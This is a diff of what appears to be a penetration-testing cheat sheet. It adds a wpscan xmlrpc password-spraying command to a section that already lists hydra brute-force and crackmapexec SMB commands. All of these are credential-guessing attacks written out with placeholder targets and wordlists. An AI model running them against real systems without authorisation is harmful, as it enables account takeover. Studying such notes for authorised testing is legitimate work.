@@ -187,6 +187,9 @@ hydra -l admin -P 2023-200_most_used_passwords.txt -f <IP> -s 80 http-post-form 
 
 # Custom password policy
 crackmapexec smb <IP> -u avazquez -p Password123 --pass-pol
+
+# WPScan WordPress password attack using xmlrpc
+sudo wpscan --password-attack xmlrpc -t 20 -U <USER> -P ~/Wordlists/rockyou.txt --url http://<IP>/ 
 ```
 ### Cracking Passwords
 ```bash
